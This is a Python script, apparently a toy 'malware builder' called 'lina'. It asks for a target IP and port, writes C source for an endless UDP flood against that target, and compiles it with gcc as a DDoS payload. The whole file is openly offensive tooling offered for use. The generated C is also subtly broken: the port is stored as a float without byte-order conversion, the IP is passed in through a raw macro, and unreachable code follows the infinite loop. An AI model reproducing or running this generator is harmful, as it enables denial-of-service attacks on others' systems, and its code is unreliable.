from colorama import Fore, Back, Style
import sys,os




def wellcome():
    print (Fore.RED)
    print ("__         __   ____________             ___ ")
    print ("__         __   __        __           __   __")
    print ("__         __   __        __         __       __")
    print ("__         __   __        __       _______________")
    print ("__         __   __        __     __               __")
    print ("_______    __   __        __   __                   __\n\n")

    text = input("lina >>")

    if text == "help":
        print ("------------------------------------------------------")
        print ("just select the malware!\n")
        print ("[ 1 ] linux/DDoS/payload")
        print ("-------------------------------------------------------")
        wellcome()
    if text == "1":
        option = input("lina >> type the ip: ")
        option2 = input("Lina >> type the port: ")
        option3 = input("lina >> type the name whithout extention: ")
        payload = open("paylo.c","wt")
        payload.write("#include <stdio.h>\n")
        payload.write("#include <stdlib.h>\n")
        payload.write("#include <sys/types.h>\n")
        payload.write("#include <sys/socket.h>\n")
        payload.write("#include <netinet/in.h>\n")
        payload.write(F"float port = {option2};\n")
        payload.write(F"#define target {option}\n")
        payload.write("int main() \n")
        payload.write("{\n")
        payload.write("    int client;\n")
        payload.write('    char sendtext[10]="Hello";\n')
        payload.write("    client = socket(AF_INET,SOCK_DGRAM,0);\n")
        payload.write("    struct sockaddr_in estructura;\n")
        payload.write("    estructura.sin_family = AF_INET;\n")
        payload.write("    estructura.sin_port = port;\n")
        payload.write("    estructura.sin_addr.s_addr = target;\n")
        payload.write("    connect(client,(struct sockaddr*)&estructura,sizeof(estructura));\n")
        payload.write("    while (1)\n")
        payload.write("    {\n")
        payload.write("        send(client,sendtext,sizeof(sendtext),0);\n")
        payload.write("    }\n")
        payload.write('system("pause");\n')
        payload.write("}\n")
        payload.close()
        try:
            os.system(F"gcc -o {option3} paylo.c")
            os.system("rm paylo.c")
            print("you payload is ready! its name is  pay")
        except:
            print("Error")
        wellcome()

        
wellcome()
